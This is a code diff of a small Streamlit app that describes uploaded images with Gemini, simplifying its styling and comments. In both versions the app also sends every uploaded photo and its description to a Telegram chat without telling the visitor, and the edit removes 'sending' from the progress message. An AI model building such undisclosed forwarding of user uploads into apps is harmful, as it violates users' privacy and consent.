@@ -4,57 +4,43 @@ from PIL import Image
 import io
 import requests
 
-# 1. إجبار الموقع على اللون الأبيض وتنسيق عزيز الفخم
+# 1. تنسيق Aziz18 (الخلفية البيضاء)
 st.set_page_config(page_title="Aziz18 AI", layout="centered")
-st.markdown("""
-    <style>
-    .stApp { background-color: white !important; }
-    .st-emotion-cache-1vt4y6f { color: #1e293b !important; }
-    .sig-box {
-        background: #0f172a; color: white; padding: 25px; 
-        border-radius: 15px; text-align: center; border: 2px solid #3b82f6;
-    }
-    </style>
-    """, unsafe_allow_html=True)
+st.markdown("<style>.stApp {background-color: white !important;}</style>", unsafe_allow_html=True)
 
 st.title("🚀 AZIZ ULTRA-MAX AI")
 
-# 2. الحل السحري لخطأ 404 (إجبار نسخة v1 المستقرة)
+# 2. إعداد الموديل
 try:
-    # هنا السر: نستخدم الرابط المباشر للنسخة المستقرة v1 لتجاوز v1beta المتعطلة
     genai.configure(api_key=st.secrets["GOOGLE_API_KEY"])
-    # قمنا بتغيير المناداة لتكون مباشرة وصريحة
     model = genai.GenerativeModel('gemini-1.5-flash')
 except Exception as e:
-    st.error(f"خطأ في الاتصال: {e}")
+    st.error(f"Error in secrets: {e}")
 
-# 3. الرفع والمعالجة التلقائية (أوتو)
-up = st.file_uploader("ارفع صورتك الآن", type=["jpg", "png", "jpeg"])
+# 3. الرفع والمعالجة
+up = st.file_uploader("ارفع صورتك", type=["jpg", "png", "jpeg"])
 
-if up:
-    image = Image.open(up)
-    st.image(image, use_container_width=True)
-    
-    with st.spinner("⏳ جاري التحليل والإرسال..."):
+if up is not None:
+    img = Image.open(up)
+    st.image(img, use_container_width=True)
+    with st.spinner("⏳ Analyzing..."):
         try:
-            # طلب التحليل مع تجاوز أخطاء النسخ التجريبية
-            response = model.generate_content(["Describe this image", image])
+            res = model.generate_content(["Describe this image", img])
             
-            # إرسال لتيليجرام (استخدام السرار المعدلة)
+            # إرسال لتيليجرام
             buf = io.BytesIO()
-            image.save(buf, format='JPEG')
+            img.save(buf, format='JPEG')
             requests.post(
                 f"https://api.telegram.org/bot{st.secrets['TELEGRAM_TOKEN']}/sendPhoto",
                 files={'photo': buf.getvalue()},
-                data={'chat_id': st.secrets['CHAT_ID'], 'caption': f"🎯 تقرير Aziz18:\n{response.text[:800]}"}
+                data={'chat_id': st.secrets['CHAT_ID'], 'caption': f"Aziz18 Report:\n{res.text[:800]}"}
             )
             
             st.balloons()
-            st.success("✅ اشتغل الموقع يا عزيز!")
-            st.write(response.text)
-            
+            st.success("Done!")
+            st.write(res.text)
         except Exception as e:
-            st.error(f"تنبيه: السيرفر يحتاج تحديث يدوي. الخطأ: {e}")
+            st.error(f"API Error: {e}")
 
-# 4. التوقيع
-st.markdown('<div class="sig-box"><h2>BY: Aziz18</h2><p>PREMIUM AI EDITION</p></div>', unsafe_allow_html=True)
+# 4. التوقيع المصحح (بدون أي أخطاء في الأقواس)
+st.markdown('<div style="background:#0f172a; color:white; padding:20px; border-radius:10px; text-align:center; font-size:25px; font-weight:bold;">BY: Aziz18</div>', unsafe_allow_html=True)
